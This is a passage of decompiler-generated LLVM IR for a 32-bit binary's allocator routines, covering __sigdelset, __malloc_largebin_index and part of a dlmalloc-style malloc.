  %v4_804a3ed = inttoptr i32 %v3_804a3ed to i32*
  %v5_804a3ed = load i32, i32* %v4_804a3ed, align 4
  %v7_804a3ed = or i32 %v5_804a3ed, %v6_804a3ed
  store i32 %v7_804a3ed, i32* %v4_804a3ed, align 4
  %v2_804a3f2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804a3f2, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_804a3ea, { 1, 0 }
  uselistorder i32 %v1_804a3e5, { 2, 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_804a402 = add i32 %arg2, -1
  %v1_804a405 = urem i32 %v1_804a402, 32
  %v2_804a405 = icmp eq i32 %v1_804a405, 0
  br i1 %v2_804a405, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v4_804a408 = shl i32 -2, %v1_804a405
  %v5_804a408 = sub nsw i32 32, %v1_804a405
  %v6_804a408 = lshr i32 -2, %v5_804a408
  %v7_804a408 = or i32 %v6_804a408, %v4_804a408
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_804a40d = phi i32 [ -2, %entry ], [ %v7_804a408, %bb ]
  %v2_804a40a = udiv i32 %v1_804a402, 32
  %v2_804a40d = mul nuw nsw i32 %v2_804a40a, 4
  %v3_804a40d = add i32 %v2_804a40d, %arg1
  %v4_804a40d = inttoptr i32 %v3_804a40d to i32*
  %v5_804a40d = load i32, i32* %v4_804a40d, align 4
  %v7_804a40d = and i32 %v5_804a40d, %v6_804a40d
  store i32 %v7_804a40d, i32* %v4_804a40d, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_804a405, { 1, 2, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_804a414 = load i32, i32* @eax, align 4
  %v6_804a427 = icmp ugt i32 %v0_804a414, 16777215
  br i1 %v6_804a427, label %dec_label_pc_804a438, label %dec_label_pc_804a429

dec_label_pc_804a429:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_804a414, 256
  %v2_804a416 = udiv i32 %v0_804a414, 256
  %v2_804a429 = call i32 @llvm.ctlz.i32(i32 %v2_804a416, i1 true)
  %v3_804a429 = xor i32 %v2_804a429, 31
  %v5_804a429 = select i1 %tmp, i32 95, i32 %v3_804a429
  %v1_804a42c = add nuw nsw i32 %v5_804a429, 6
  store i32 %v1_804a42c, i32* @ecx, align 4
  %v2_804a42f = urem i32 %v1_804a42c, 32
  %v4_804a42f = icmp eq i32 %v2_804a42f, 0
  br i1 %v4_804a42f, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_804a429
  %v5_804a42f = lshr i32 %v0_804a414, %v2_804a42f
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_804a429, %bb
  %v0_804a431 = phi i32 [ %v0_804a414, %dec_label_pc_804a429 ], [ %v5_804a42f, %bb ]
  %v1_804a431 = urem i32 %v0_804a431, 4
  %v2_804a434 = mul nuw nsw i32 %v5_804a429, 4
  %v3_804a434 = or i32 %v1_804a431, 32
  %v4_804a434 = add nuw nsw i32 %v3_804a434, %v2_804a434
  br label %dec_label_pc_804a438

dec_label_pc_804a438:                             ; preds = %entry, %bb4
  %v0_804a439 = phi i32 [ 95, %entry ], [ %v4_804a434, %bb4 ]
  ret i32 %v0_804a439

; uselistorder directives
  uselistorder i32 %v2_804a42f, { 1, 0 }
  uselistorder i32 %v0_804a414, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_804a438, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804a43a = load i32, i32* @ebp, align 4
  %v0_804a43b = load i32, i32* @edi, align 4
  %v0_804a43c = load i32, i32* @esi, align 4
  %v0_804a43d = load i32, i32* @ebx, align 4
  store i32 %v0_804a43d, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804a44f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804a44f, i32* @eax, align 4
  store i32 %v2_804a44f, i32* %stack_var_-92, align 4
  %v2_804a454 = call i32 @__pthread_return_void(i32 %v2_804a44f, i32 134526883)
  store i32 %v2_804a454, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8052044.36 to i32), i32* %stack_var_-92, align 4
  %v1_804a460 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052044.36 to i32))
  store i32 %v1_804a460, i32* %eax.global-to-local, align 4
  %v0_804a468 = load i32, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v0_804a468, -32
  br i1 %tmp, label %dec_label_pc_804a47f, label %dec_label_pc_804a46d

dec_label_pc_804a46d:                             ; preds = %entry
  %v0_804a46d = load i32, i32* %stack_var_-92, align 4
  %v1_804a46d = call i32 @__errno_location(i32 %v0_804a46d)
  store i32 %v1_804a46d, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804a474 = inttoptr i32 %v1_804a46d to i32*
  store i32 12, i32* %v1_804a474, align 4
  br label %dec_label_pc_804abd2

dec_label_pc_804a47f:                             ; preds = %entry
  %v1_804a47f = add i32 %v0_804a468, 11
  %tmp128 = icmp ult i32 %v1_804a47f, 16
  br i1 %tmp128, label %dec_label_pc_804a496, label %dec_label_pc_804a48f

dec_label_pc_804a48f:                             ; preds = %dec_label_pc_804a47f
  %v1_804a48f = and i32 %v1_804a47f, -8
  br label %dec_label_pc_804a496

dec_label_pc_804a496:                             ; preds = %dec_label_pc_804a47f, %dec_label_pc_804a48f
  %storemerge125 = phi i32 [ %v1_804a48f, %dec_label_pc_804a48f ], [ %v1_804a47f, %dec_label_pc_804a47f ]
  %v1_804a836 = phi i32 [ %v1_804a48f, %dec_label_pc_804a48f ], [ 16, %dec_label_pc_804a47f ]
  store i32 %storemerge125, i32* %eax.global-to-local, align 4
  %v0_804a496 = load i8, i8* @global_var_8054600.37, align 1
  %v1_804a496 = sext i8 %v0_804a496 to i32
  store i32 %v1_804a496, i32* @ebx, align 4
  %v3_804a49c = urem i8 %v0_804a496, 2
  %v4_804a49c = icmp eq i8 %v3_804a49c, 0
  %v1_804a49f = icmp eq i1 %v4_804a49c, false
  br i1 %v1_804a49f, label %dec_label_pc_804a4be, label %dec_label_pc_804a4a1

dec_label_pc_804a4a1:                             ; preds = %dec_label_pc_804a496
  %v2_804a4a1 = icmp eq i8 %v0_804a496, 0
  %v1_804a4a3 = icmp eq i1 %v2_804a4a1, false
  br i1 %v1_804a4a3, label %dec_label_pc_804a7a1, label %dec_label_pc_804a4a9

dec_label_pc_804a4a9:                             ; preds = %dec_label_pc_804a4a1
  store i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32* %stack_var_-92, align 4
  %v2_804a4b1 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8054600.37 to i32*))
  store i32 %v2_804a4b1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a7a1

dec_label_pc_804a4be:                             ; preds = %dec_label_pc_804a496
  %v11_804a4be = trunc i32 %v1_804a836 to i8
  %v8_804a4c2 = icmp ugt i8 %v11_804a4be, %v0_804a496
  br i1 %v8_804a4c2, label %dec_label_pc_804a4df, label %dec_label_pc_804a4c4

dec_label_pc_804a4c4:                             ; preds = %dec_label_pc_804a4be
  %v2_804a4c8 = udiv i32 %v1_804a836, 2
  store i32 %v2_804a4c8, i32* %eax.global-to-local, align 4
  %v1_804a4ca = add i32 %v2_804a4c8, ptrtoint (i8* @global_var_8054600.37 to i32)
  store i32 %v1_804a4ca, i32* @ecx, align 4
  %v1_804a4d0 = add i32 %v2_804a4c8, add (i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32 -4)
  %v2_804a4d0 = inttoptr i32 %v1_804a4d0 to i32*
  %v3_804a4d0 = load i32, i32* %v2_804a4d0, align 4
  store i32 %v3_804a4d0, i32* @edx, align 4
  %v1_804a4d3 = icmp eq i32 %v3_804a4d0, 0
  br i1 %v1_804a4d3, label %dec_label_pc_804a4df, label %dec_label_pc_804a4d7

dec_label_pc_804a4d7:                             ; preds = %dec_label_pc_804a4c4
  %v1_804a4d7 = add i32 %v3_804a4d0, 8
  %v2_804a4d7 = inttoptr i32 %v1_804a4d7 to i32*
  %v3_804a4d7 = load i32, i32* %v2_804a4d7, align 4
  store i32 %v3_804a4d7, i32* %eax.global-to-local, align 4
  store i32 %v3_804a4d7, i32* %v2_804a4d0, align 4
  br label %dec_label_pc_804a518

dec_label_pc_804a4df:                             ; preds = %dec_label_pc_804a4c4, %dec_label_pc_804a4be
  %v8_804a4df = icmp ult i32 %v1_804a836, 255
  %v6_804a4e7 = icmp ugt i32 %v1_804a836, 255
  store i32 %v1_804a836, i32* @eax, align 4
  br i1 %v6_804a4e7, label %dec_label_pc_804a520, label %dec_label_pc_804a4e9

dec_label_pc_804a4e9:                             ; preds = %dec_label_pc_804a4df
  %v2_804a4ed = udiv i32 %v1_804a836, 8
  store i32 %v2_804a4ed, i32* %eax.global-to-local, align 4
  %v1_804a4f0 = mul nuw i32 %v2_804a4ed, 8
  %v2_804a4f0 = add i32 %v1_804a4f0, ptrtoint (i32* @global_var_805462c.38 to i32)
  store i32 %v2_804a4f0, i32* @ecx, align 4
  %v1_804a4fb = add i32 %v1_804a4f0, add (i32 ptrtoint (i32* @global_var_805462c.38 to i32), i32 12)
  %v2_804a4fb = inttoptr i32 %v1_804a4fb to i32*
  %v3_804a4fb = load i32, i32* %v2_804a4fb, align 4
  store i32 %v3_804a4fb, i32* @edx, align 4
  %v12_804a4fe = icmp eq i32 %v3_804a4fb, %v2_804a4f0
  br i1 %v12_804a4fe, label %dec_label_pc_804a61c.preheader, label %dec_label_pc_804a506

dec_label_pc_804a506:                             ; preds = %dec_label_pc_804a4e9
  store i32 %v1_804a836, i32* %ebx.global-to-local, align 4
  %v1_804a50a = add i32 %v3_804a4fb, 12
  %v2_804a50a = inttoptr i32 %v1_804a50a to i32*
  %v3_804a50a = load i32, i32* %v2_804a50a, align 4
  store i32 %v3_804a50a, i32* %eax.global-to-local, align 4
  %v2_804a50d = or i32 %v1_804a836, 4
  %v3_804a50d = add i32 %v3_804a4fb, %v2_804a50d
  %v4_804a50d = inttoptr i32 %v3_804a50d to i32*
  %v5_804a50d = load i32, i32* %v4_804a50d, align 4
  %v6_804a50d = or i32 %v5_804a50d, 1
  store i32 %v6_804a50d, i32* %v4_804a50d, align 4
  %v0_804a512 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a512 = load i32, i32* @ecx, align 4
  %v2_804a512 = add i32 %v1_804a512, 12
  %v3_804a512 = inttoptr i32 %v2_804a512 to i32*
  store i32 %v0_804a512, i32* %v3_804a512, align 4
  %v0_804a515 = load i32, i32* @ecx, align 4
  %v1_804a515 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a515 = add i32 %v1_804a515, 8
  %v3_804a515 = inttoptr i32 %v2_804a515 to i32*
  store i32 %v0_804a515, i32* %v3_804a515, align 4
  br label %dec_label_pc_804a518

dec_label_pc_804a518:                             ; preds = %dec_label_pc_804a4d7, %dec_label_pc_804a506
  %v0_804a518 = load i32, i32* @edx, align 4
  %v1_804a518 = add i32 %v0_804a518, 8
  store i32 %v1_804a518, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804abc1

dec_label_pc_804a520:                             ; preds = %dec_label_pc_804a4df
  %v0_804a524 = call i32 @__malloc_largebin_index()
  store i32 %v0_804a524, i32* %eax.global-to-local, align 4
  %v3_804a529 = and i8 %v0_804a496, 2
  %v4_804a529 = icmp eq i8 %v3_804a529, 0
  br i1 %v4_804a529, label %dec_label_pc_804a61c.preheader, label %dec_label_pc_804a536

dec_label_pc_804a536:                             ; preds = %dec_label_pc_804a520
  store i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32* %stack_var_-92, align 4
  %v2_804a53e = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8054600.37 to i32*))
  store i32 %v2_804a53e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a61c.preheader

dec_label_pc_804a61c.preheader:                   ; preds = %dec_label_pc_804a536, %dec_label_pc_804a4e9, %dec_label_pc_804a520
  %stack_var_-40.0.ph = phi i32 [ %v2_804a4ed, %dec_label_pc_804a4e9 ], [ %v0_804a524, %dec_label_pc_804a536 ], [ %v0_804a524, %dec_label_pc_804a520 ]
  %v1_804a572 = add i32 %v1_804a836, 16
  %v0_804a61c107 = load i32, i32* @global_var_8054640.41, align 64
  store i32 %v0_804a61c107, i32* @ebp, align 4
  %v9_804a622110 = icmp eq i32 %v0_804a61c107, 134563380
  %v1_804a628112 = icmp eq i1 %v9_804a622110, false
  br i1 %v1_804a628112, label %dec_label_pc_804a54b, label %dec_label_pc_804a62e

dec_label_pc_804a54b:                             ; preds = %dec_label_pc_804a61c.preheader, %bb82
  %v0_804a61c113 = phi i32 [ %v0_804a61c, %bb82 ], [ %v0_804a61c107, %dec_label_pc_804a61c.preheader ]
  %v1_804a54b = add i32 %v0_804a61c113, 4
  %v2_804a54b = inttoptr i32 %v1_804a54b to i32*
  %v3_804a54b = load i32, i32* %v2_804a54b, align 4
  %v1_804a54e = add i32 %v0_804a61c113, 12
  %v2_804a54e = inttoptr i32 %v1_804a54e to i32*
  %v3_804a54e = load i32, i32* %v2_804a54e, align 4
  store i32 %v3_804a54e, i32* @edx, align 4
  %v1_804a551 = and i32 %v3_804a54b, -4
  store i32 %v1_804a551, i32* @edi, align 4
  br i1 %v6_804a4e7, label %dec_label_pc_804a57d, label %dec_label_pc_804a55e

dec_label_pc_804a55e:                             ; preds = %dec_label_pc_804a54b
  %v9_804a55e = icmp eq i32 %v3_804a54e, 134563380
  %v1_804a564 = icmp eq i1 %v9_804a55e, false
  br i1 %v1_804a564, label %dec_label_pc_804a57d, label %dec_label_pc_804a566

dec_label_pc_804a566:                             ; preds = %dec_label_pc_804a55e
  %v1_804a566 = load i32, i32* @global_var_8054630.39, align 16
  %v12_804a566 = icmp eq i32 %v0_804a61c113, %v1_804a566
  %v1_804a56c = icmp eq i1 %v12_804a566, false
  br i1 %v1_804a56c, label %dec_label_pc_804a57d, label %dec_label_pc_804a56e

dec_label_pc_804a56e:                             ; preds = %dec_label_pc_804a566
  store i32 %v1_804a572, i32* %eax.global-to-local, align 4
  %v6_804a577 = icmp ugt i32 %v1_804a551, %v1_804a572
  br i1 %v6_804a577, label %dec_label_pc_804ab5c, label %dec_label_pc_804a57d

dec_label_pc_804a57d:                             ; preds = %dec_label_pc_804a56e, %dec_label_pc_804a566, %dec_label_pc_804a55e, %dec_label_pc_804a54b
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %eax.global-to-local, align 4
  store i32 %v3_804a54e, i32* @global_var_8054640.41, align 4
  %v2_804a585 = add i32 %v3_804a54e, 8
  %v3_804a585 = inttoptr i32 %v2_804a585 to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v3_804a585, align 4
  %v0_804a588 = load i32, i32* @edi, align 4
  %v15_804a588 = icmp eq i32 %v0_804a588, %v1_804a836
  br i1 %v15_804a588, label %dec_label_pc_804ab9d, label %dec_label_pc_804a592

dec_label_pc_804a592:                             ; preds = %dec_label_pc_804a57d
  %v6_804a598 = icmp ugt i32 %v0_804a588, 255
  br i1 %v6_804a598, label %dec_label_pc_804a5ab, label %dec_label_pc_804a59a

dec_label_pc_804a59a:                             ; preds = %dec_label_pc_804a592
  %v2_804a59c = udiv i32 %v0_804a588, 8
  store i32 %v2_804a59c, i32* %esi.global-to-local, align 4
  %v1_804a59f = mul nuw i32 %v2_804a59c, 8
  %v2_804a59f = add i32 %v1_804a59f, 134563372
  store i32 %v2_804a59f, i32* @ebx, align 4
  %v1_804a5a6 = add i32 %v1_804a59f, 134563380
  %v2_804a5a6 = inttoptr i32 %v1_804a5a6 to i32*
  %v3_804a5a6 = load i32, i32* %v2_804a5a6, align 4
  store i32 %v3_804a5a6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a5f4

dec_label_pc_804a5ab:                             ; preds = %dec_label_pc_804a592
  store i32 %v0_804a588, i32* @eax, align 4
  %v0_804a5ad = call i32 @__malloc_largebin_index()
  store i32 %v0_804a5ad, i32* %esi.global-to-local, align 4
  %v1_804a5b4 = mul i32 %v0_804a5ad, 8
  %v2_804a5b4 = add i32 %v1_804a5b4, ptrtoint (i32* @global_var_805462c.38 to i32)
  store i32 %v2_804a5b4, i32* %eax.global-to-local, align 4
  %v1_804a5bb = add i32 %v1_804a5b4, add (i32 ptrtoint (i32* @global_var_805462c.38 to i32), i32 8)
  %v2_804a5bb = inttoptr i32 %v1_804a5bb to i32*
  %v3_804a5bb = load i32, i32* %v2_804a5bb, align 4
  store i32 %v3_804a5bb, i32* %edx.global-to-local, align 4
  %v12_804a5be = icmp eq i32 %v3_804a5bb, %v2_804a5b4
  store i32 %v3_804a5bb, i32* @ebx, align 4
  br i1 %v12_804a5be, label %dec_label_pc_804a5f4, label %dec_label_pc_804a5c8

dec_label_pc_804a5c8:                             ; preds = %dec_label_pc_804a5ab
  %v1_804a5c8 = add i32 %v1_804a5b4, add (i32 ptrtoint (i32* @global_var_805462c.38 to i32), i32 12)
  %v2_804a5c8 = inttoptr i32 %v1_804a5c8 to i32*
  %v3_804a5c8 = load i32, i32* %v2_804a5c8, align 4
  store i32 %v3_804a5c8, i32* @ebx, align 4
  %v0_804a5cb = load i32, i32* @edi, align 4
  %v2_804a5cb = add i32 %v3_804a5c8, 4
  %v3_804a5cb = inttoptr i32 %v2_804a5cb to i32*
  %v4_804a5cb = load i32, i32* %v3_804a5cb, align 4
  %v10_804a5cb = icmp ult i32 %v0_804a5cb, %v4_804a5cb
  %v1_804a5ce = icmp eq i1 %v10_804a5cb, false
  br i1 %v1_804a5ce, label %dec_label_pc_804a5d6, label %dec_label_pc_804a5f4

dec_label_pc_804a5d6:                             ; preds = %dec_label_pc_804a5c8
  %v1_804a5d8 = or i32 %v0_804a5cb, 1
  store i32 %v1_804a5d8, i32* %eax.global-to-local, align 4
  store i32 %v3_804a5bb, i32* %ebx.global-to-local, align 4
  %v2_804a5ec100 = add i32 %v3_804a5bb, 4
  %v3_804a5ec101 = inttoptr i32 %v2_804a5ec100 to i32*
  %v4_804a5ec102 = load i32, i32* %v3_804a5ec101, align 4
  %v10_804a5ec104 = icmp ult i32 %v1_804a5d8, %v4_804a5ec102
  br i1 %v10_804a5ec104, label %dec_label_pc_804a5dd, label %dec_label_pc_804a5f1

dec_label_pc_804a5dd:                             ; preds = %dec_label_pc_804a5d6, %dec_label_pc_804a5dd
  %v0_804a5f1105 = phi i32 [ %v3_804a5e1, %dec_label_pc_804a5dd ], [ %v3_804a5bb, %dec_label_pc_804a5d6 ]
  store i32 %v0_804a5f1105, i32* %ecx.global-to-local, align 4
  %v1_804a5e1 = add i32 %v0_804a5f1105, 8
  %v2_804a5e1 = inttoptr i32 %v1_804a5e1 to i32*
  %v3_804a5e1 = load i32, i32* %v2_804a5e1, align 4
  store i32 %v3_804a5e1, i32* %ecx.global-to-local, align 4
  store i32 %v3_804a5e1, i32* %ebx.global-to-local, align 4
  %v2_804a5ec = add i32 %v3_804a5e1, 4
  %v3_804a5ec = inttoptr i32 %v2_804a5ec to i32*
  %v4_804a5ec = load i32, i32* %v3_804a5ec, align 4
  %v10_804a5ec = icmp ult i32 %v1_804a5d8, %v4_804a5ec
  br i1 %v10_804a5ec, label %dec_label_pc_804a5dd, label %dec_label_pc_804a5f1

dec_label_pc_804a5f1:                             ; preds = %dec_label_pc_804a5dd, %dec_label_pc_804a5d6
  %v0_804a5f1.lcssa = phi i32 [ %v3_804a5bb, %dec_label_pc_804a5d6 ], [ %v3_804a5e1, %dec_label_pc_804a5dd ]
  %v1_804a5f1 = add i32 %v0_804a5f1.lcssa, 12
  %v2_804a5f1 = inttoptr i32 %v1_804a5f1 to i32*
  %v3_804a5f1 = load i32, i32* %v2_804a5f1, align 4
  store i32 %v3_804a5f1, i32* @ebx, align 4
  br label %dec_label_pc_804a5f4

dec_label_pc_804a5f4:                             ; preds = %dec_label_pc_804a59a, %dec_label_pc_804a5c8, %dec_label_pc_804a5ab, %dec_label_pc_804a5f1
  %v0_804a5f4 = phi i32 [ %v0_804a5ad, %dec_label_pc_804a5ab ], [ %v0_804a5ad, %dec_label_pc_804a5f1 ], [ %v0_804a5ad, %dec_label_pc_804a5c8 ], [ %v2_804a59c, %dec_label_pc_804a59a ]
  %stack_var_-64.1 = phi i32 [ %v3_804a5bb, %dec_label_pc_804a5ab ], [ %v0_804a5f1.lcssa, %dec_label_pc_804a5f1 ], [ %v2_804a5b4, %dec_label_pc_804a5c8 ], [ %v3_804a5a6, %dec_label_pc_804a59a ]
  %v1_804a5f6 = urem i32 %v0_804a5f4, 32
  %v2_804a5f6 = icmp eq i32 %v1_804a5f6, 0
  store i32 %v1_804a5f6, i32* %esi.global-to-local, align 4
  store i32 %v1_804a5f6, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804a600 = sdiv i32 %v0_804a5f4, 32
  store i32 %v2_804a600, i32* %edx.global-to-local, align 4
  br i1 %v2_804a5f6, label %bb82, label %bb

bb:                                               ; preds = %dec_label_pc_804a5f4
  %v5_804a603 = shl i32 1, %v1_804a5f6
  store i32 %v5_804a603, i32* %eax.global-to-local, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_804a5f4, %bb
  %v5_804a605 = phi i32 [ 1, %dec_label_pc_804a5f4 ], [ %v5_804a603, %bb ]
  %v1_804a605 = mul nsw i32 %v2_804a600, 4
  %v2_804a605 = add i32 %v1_804a605, ptrtoint (i32* @global_var_8054934.42 to i32)
  %v3_804a605 = inttoptr i32 %v2_804a605 to i32*
  %v4_804a605 = load i32, i32* %v3_804a605, align 4
  %v6_804a605 = or i32 %v4_804a605, %v5_804a605
  store i32 %v6_804a605, i32* %v3_804a605, align 4
  %v0_804a60c = load i32, i32* @ebx, align 4
  %v1_804a60c = load i32, i32* @ebp, align 4
  %v2_804a60c = add i32 %v1_804a60c, 12
  %v3_804a60c = inttoptr i32 %v2_804a60c to i32*
  store i32 %v0_804a60c, i32* %v3_804a60c, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_804a613 = load i32, i32* @ebp, align 4
  %v2_804a613 = add i32 %v1_804a613, 8
  %v3_804a613 = inttoptr i32 %v2_804a613 to i32*
  store i32 %stack_var_-64.1, i32* %v3_804a613, align 4
  %v0_804a616 = load i32, i32* @ebp, align 4
  %v1_804a616 = load i32, i32* @esi, align 4
  %v2_804a616 = add i32 %v1_804a616, 12
  %v3_804a616 = inttoptr i32 %v2_804a616 to i32*
  store i32 %v0_804a616, i32* %v3_804a616, align 4
  %v0_804a619 = load i32, i32* @ebp, align 4
  %v1_804a619 = load i32, i32* @ebx, align 4
  %v2_804a619 = add i32 %v1_804a619, 8
  %v3_804a619 = inttoptr i32 %v2_804a619 to i32*
  store i32 %v0_804a619, i32* %v3_804a619, align 4
  %v0_804a61c = load i32, i32* @global_var_8054640.41, align 64
  store i32 %v0_804a61c, i32* @ebp, align 4
  %v9_804a622 = icmp eq i32 %v0_804a61c, 134563380
  %v1_804a628 = icmp eq i1 %v9_804a622, false
  br i1 %v1_804a628, label %dec_label_pc_804a54b, label %dec_label_pc_804a62e

dec_label_pc_804a62e:                             ; preds = %bb82, %dec_label_pc_804a61c.preheader
  br i1 %v8_804a4df, label %dec_label_pc_804a6bc, label %dec_label_pc_804a63c

dec_label_pc_804a63c:                             ; preds = %dec_label_pc_804a62e
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_804a640 = mul i32 %stack_var_-40.0.ph, 8
  %v2_804a640 = add i32 %v1_804a640, ptrtoint (i32* @global_var_805462c.38 to i32)
  store i32 %v2_804a640, i32* %edx.global-to-local, align 4
  %v1_804a647 = add i32 %v1_804a640, add (i32 ptrtoint (i32* @global_var_805462c.38 to i32), i32 12)
  %v2_804a647 = inttoptr i32 %v1_804a647 to i32*
  %storemerge1.pre = load i32, i32* %v2_804a647, align 4
  br label %dec_label_pc_804a6b8

dec_label_pc_804a64c:                             ; preds = %dec_label_pc_804a6b8
  %v1_804a64c = add i32 %v4_804a663, 4
  %v2_804a64c = inttoptr i32 %v1_804a64c to i32*
  %v3_804a64c = load i32, i32* %v2_804a64c, align 4
  store i32 %v3_804a64c, i32* %ebx.global-to-local, align 4
  %v1_804a64f = add i32 %v4_804a663, 12
  %v2_804a64f = inttoptr i32 %v1_804a64f to i32*
  %v3_804a64f = load i32, i32* %v2_804a64f, align 4
  store i32 %v3_804a64f, i32* @ecx, align 4
  %v1_804a652 = and i32 %v3_804a64c, -4
  store i32 %v1_804a652, i32* @ebx, align 4
  %v10_804a655 = icmp ult i32 %v1_804a652, %v1_804a836
  br i1 %v10_804a655, label %dec_label_pc_804a6b8, label %dec_label_pc_804a65b

dec_label_pc_804a65b:                             ; preds = %dec_label_pc_804a64c
  %v1_804a65b = add i32 %v4_804a663, 8
  %v2_804a65b = inttoptr i32 %v1_804a65b to i32*
  %v3_804a65b = load i32, i32* %v2_804a65b, align 4
  store i32 %v3_804a65b, i32* @edx, align 4
  %v1_804a65e = add i32 %v3_804a65b, 12
  %v2_804a65e = inttoptr i32 %v1_804a65e to i32*
  %v3_804a65e = load i32, i32* %v2_804a65e, align 4
  %v15_804a65e = icmp eq i32 %v3_804a65e, %v4_804a663
  %v1_804a661 = icmp eq i1 %v15_804a65e, false
  br i1 %v1_804a661, label %dec_label_pc_804a668, label %dec_label_pc_804a663

dec_label_pc_804a663:                             ; preds = %dec_label_pc_804a65b
  %v1_804a663 = add i32 %v3_804a64f, 8
  %v2_804a663 = inttoptr i32 %v1_804a663 to i32*
  %v3_804a663 = load i32, i32* %v2_804a663, align 4
  %v15_804a663 = icmp eq i32 %v3_804a663, %v4_804a663
  br i1 %v15_804a663, label %dec_label_pc_804a66d, label %dec_label_pc_804a668

dec_label_pc_804a668:                             ; preds = %dec_label_pc_804a663, %dec_label_pc_804a65b
  %v0_804a668 = call i32 @abort()
  store i32 %v0_804a668, i32* %eax.global-to-local, align 4
  %v0_804a66d.pre = load i32, i32* @ebx, align 4
  %v0_804a673.pre = load i32, i32* @ecx, align 4
  %v1_804a673.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804a66d

dec_label_pc_804a66d:                             ; preds = %dec_label_pc_804a663, %dec_label_pc_804a668
  %v1_804a673 = phi i32 [ %v3_804a65b, %dec_label_pc_804a663 ], [ %v1_804a673.pre, %dec_label_pc_804a668 ]
  %v0_804a673 = phi i32 [ %v3_804a64f, %dec_label_pc_804a663 ], [ %v0_804a673.pre, %dec_label_pc_804a668 ]
  %v0_804a66d = phi i32 [ %v1_804a652, %dec_label_pc_804a663 ], [ %v0_804a66d.pre, %dec_label_pc_804a668 ]
  %v5_804a66f = sub i32 %v0_804a66d, %v1_804a836
  store i32 %v5_804a66f, i32* %esi.global-to-local, align 4
  %v2_804a673 = add i32 %v1_804a673, 12
  %v3_804a673 = inttoptr i32 %v2_804a673 to i32*
  store i32 %v0_804a673, i32* %v3_804a673, align 4
  %v0_804a676 = load i32, i32* @edx, align 4
  %v1_804a676 = load i32, i32* @ecx, align 4
  %v2_804a676 = add i32 %v1_804a676, 8
  %v3_804a676 = inttoptr i32 %v2_804a676 to i32*
  store i32 %v0_804a676, i32* %v3_804a676, align 4
  %v0_804a679 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a679 = add i32 %v0_804a679, 8
  store i32 %v1_804a679, i32* @ecx, align 4
  %v0_804a67c = load i32, i32* %esi.global-to-local, align 4
  %tmp129 = icmp ult i32 %v0_804a67c, 16
  br i1 %tmp129, label %dec_label_pc_804abab, label %dec_label_pc_804a685

dec_label_pc_804a685:                             ; preds = %dec_label_pc_804a66d
  %v2_804a689 = add i32 %v0_804a679, %v1_804a836
  store i32 %v2_804a689, i32* @edx, align 4
  %v1_804a68c = or i32 %v1_804a836, 1
  store i32 %v1_804a68c, i32* %ebx.global-to-local, align 4
  %v2_804a68f = add i32 %v0_804a679, 4
  %v3_804a68f = inttoptr i32 %v2_804a68f to i32*
  store i32 %v1_804a68c, i32* %v3_804a68f, align 4
  %v0_804a692 = load i32, i32* %esi.global-to-local, align 4
  %v1_804a694 = or i32 %v0_804a692, 1
  store i32 %v1_804a694, i32* %eax.global-to-local, align 4
  %v0_804a697 = load i32, i32* @edx, align 4
  %v1_804a697 = load i32, i32* @ebp, align 4
  %v2_804a697 = add i32 %v1_804a697, 8
  %v3_804a697 = inttoptr i32 %v2_804a697 to i32*
  store i32 %v0_804a697, i32* %v3_804a697, align 4
  %v0_804a69a = load i32, i32* @edx, align 4
  %v1_804a69a = load i32, i32* @ebp, align 4
  %v2_804a69a = add i32 %v1_804a69a, 12
  %v3_804a69a = inttoptr i32 %v2_804a69a to i32*
  store i32 %v0_804a69a, i32* %v3_804a69a, align 4
  %v0_804a69d = load i32, i32* @edx, align 4
  %v1_804a69d = add i32 %v0_804a69d, 8
  %v2_804a69d = inttoptr i32 %v1_804a69d to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v2_804a69d, align 4
